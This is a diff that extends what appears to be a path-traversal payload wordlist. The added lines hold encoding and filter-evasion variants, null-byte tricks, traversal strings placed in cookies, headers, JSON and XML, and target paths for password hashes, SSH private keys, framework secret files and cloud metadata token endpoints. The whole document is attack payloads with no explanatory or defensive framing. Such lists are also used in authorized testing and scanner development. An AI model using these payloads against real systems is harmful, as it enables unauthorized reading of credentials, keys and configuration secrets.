@@ -55,3 +55,293 @@
 ../../../.env
 ../../../web.config
 ../../../application.properties
+
+# Advanced encoding techniques
+..%c0%af
+..%c1%9c
+..%e0%80%af
+..%f0%80%80%af
+..%c0%2f
+..%c0%5c
+
+# Unicode bypass
+..%u2216
+..%u2215
+..%uEFC8
+..%uF025
+
+# 16-bit Unicode
+..%c0%af
+..%c1%9c
+%c0%ae%c0%ae/
+%c0%ae%c0%ae%c0%af
+
+# UTF-8 encoding
+%e0%80%ae%e0%80%ae/
+%c0%2e%c0%2e/
+%uff0e%uff0e/
+
+# Overlong UTF-8
+..%c0%af
+..%e0%80%af
+..%c0%2e%c0%2e%c0%2f
+
+# Backslash variations
+..\
+..\..
+..\\
+..\\..\\
+%2e%2e%5c
+%2e%2e%2f
+
+# Mixed slash/backslash
+..\/
+..\/..\
+../\..\
+..\/../
+
+# Absolute path bypass
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/var/log/apache2/access.log
+/var/log/auth.log
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/fd/0
+/proc/self/fd/1
+/proc/self/fd/2
+
+# Windows absolute paths
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\System32\config\SAM
+C:\Windows\System32\config\SYSTEM
+C:\boot.ini
+C:\inetpub\wwwroot\web.config
+
+# Nested traversal
+....//
+....\/
+..../\
+....\\
+
+# Dot segment bypass
+./../
+./../../
+././../
+./.././../
+
+# Multiple slashes
+...//
+....///
+.....////
+
+# Filter bypass with current directory
+.//.//.//.//..//
+.//.//.//.//.//
+
+# Stripped traversal (if ../ is filtered)
+...//...//
+....\/....\/
+..;/..;/
+..;//..;//
+
+# Null byte variations
+../../../etc/passwd%00
+../../../etc/passwd%00.png
+../../../etc/passwd\x00
+../../../etc/passwd\0
+
+# Path normalization bypass
+/var/www/../../etc/passwd
+/./var/./www/./../../etc/passwd
+//var//www//../../etc/passwd
+
+# URL parameter pollution
+?file=safe.txt&file=../../../etc/passwd
+?path=images&path=../../../etc/passwd
+
+# Common web files
+../../../index.php
+../../../index.html
+../../../wp-config.php
+../../../configuration.php
+../../../settings.php
+../../../config.php
+../.git/config
+../.env
+../.htaccess
+
+# Framework-specific files
+# Laravel
+../../../.env
+../../../storage/logs/laravel.log
+../../../config/database.php
+../../../config/app.php
+
+# Symfony
+../../../.env.local
+../../../config/packages/security.yaml
+../../../var/log/dev.log
+
+# Django
+../../../settings.py
+../../../manage.py
+../../../db.sqlite3
+
+# Spring Boot
+../../../application.properties
+../../../application.yml
+../../../application-prod.properties
+
+# Ruby on Rails
+../../../config/database.yml
+../../../config/secrets.yml
+../../../Gemfile
+
+# Node.js/Express
+../../../package.json
+../../../.env
+../../../config/default.json
+
+# ASP.NET
+../../../web.config
+../../../Web.config
+../../../appsettings.json
+../../../appsettings.Production.json
+
+# Java
+../../../WEB-INF/web.xml
+../../../META-INF/context.xml
+../../../WEB-INF/classes/application.properties
+
+# Cloud provider metadata
+../../../../../../proc/self/environ
+../../../../../../proc/version
+../../../../../../proc/cmdline
+
+# AWS metadata
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/latest/dynamic/instance-identity/document
+
+# Azure metadata
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+
+# GCP metadata
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+# Docker
+../../../../../../proc/self/cgroup
+../../../../../../proc/self/mountinfo
+../../../../../../etc/hostname
+
+# Log files
+../../../var/log/apache2/access.log
+../../../var/log/apache2/error.log
+../../../var/log/nginx/access.log
+../../../var/log/nginx/error.log
+../../../var/log/auth.log
+../../../var/log/syslog
+../../../var/log/mail.log
+../../../var/log/mysql/error.log
+
+# Windows log files
+C:\Windows\System32\winevt\Logs\Application.evtx
+C:\Windows\System32\winevt\Logs\Security.evtx
+C:\Windows\System32\winevt\Logs\System.evtx
+
+# SSH keys
+../../../root/.ssh/id_rsa
+../../../root/.ssh/id_dsa
+../../../root/.ssh/authorized_keys
+../../../home/user/.ssh/id_rsa
+../../../home/user/.ssh/authorized_keys
+
+# Database files
+../../../var/lib/mysql/mysql/user.MYD
+../../../var/lib/postgresql/data/pg_hba.conf
+../../../var/lib/mongodb/data/db
+
+# Backup files
+../../../backup.sql
+../../../database.sql
+../../../db_backup.sql
+../../../site_backup.tar.gz
+../../../backup.zip
+
+# Source code files
+../../../.git/HEAD
+../../../.git/config
+../../../.git/logs/HEAD
+../../../.svn/entries
+../../../.hg/hgrc
+
+# Session files
+../../../tmp/sess_*
+../../../var/lib/php/sessions/sess_*
+../../../tmp/sessions/*
+
+# Cache files
+../../../tmp/cache/*
+../../../var/cache/*
+../../../storage/cache/*
+
+# Temporary files
+../../../tmp/*
+../../../temp/*
+../../../var/tmp/*
+
+# SSRF via path traversal
+file:///etc/passwd
+file:///C:/Windows/System32/drivers/etc/hosts
+file://localhost/etc/passwd
+file://127.0.0.1/etc/passwd
+
+# Path traversal in cookies
+Cookie: file=../../../etc/passwd
+Cookie: path=../../../var/www/html/index.php
+
+# Path traversal in headers
+X-File: ../../../etc/passwd
+X-Path: ../../../var/www/html/config.php
+User-Agent: ../../../etc/passwd
+Referer: ../../../etc/passwd
+
+# Path traversal in JSON
+{"file":"../../../etc/passwd"}
+{"path":"../../../var/www/html/config.php"}
+{"template":"../../../etc/passwd"}
+
+# Path traversal in XML
+<file>../../../etc/passwd</file>
+<path>../../../var/www/html/config.php</path>
+
+# Polyglot path traversal
+....//....//....//etc/passwd
+..%252f..%252f..%252fetc/passwd
+..%c0%af..%c0%af..%c0%afetc/passwd
+
+# Filter evasion
+..%00/..%00/..%00/etc/passwd
+..%20/..%20/..%20/etc/passwd
+..%09/..%09/..%09/etc/passwd
+
+# Case sensitivity (Windows)
+..\\..\\..\\..\\..\\..\\..\\.\\ETC\\PASSWD
+..\\..\\..\\..\\..\\..\\..\\.\\Etc\\Passwd
+
+# Alternate data streams (Windows)
+../../../test.txt::$DATA
+../../../test.txt::$INDEX_ALLOCATION
+
+# UNC paths (Windows)
+\\\\localhost\\C$\\Windows\\System32\\drivers\\etc\\hosts
+\\\\127.0.0.1\\C$\\Windows\\System32\\config\\SAM
+
+# Mac/Linux specific
+../../../etc/passwd
+../../../etc/master.passwd
+../../../private/etc/master.passwd
+../../../Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist
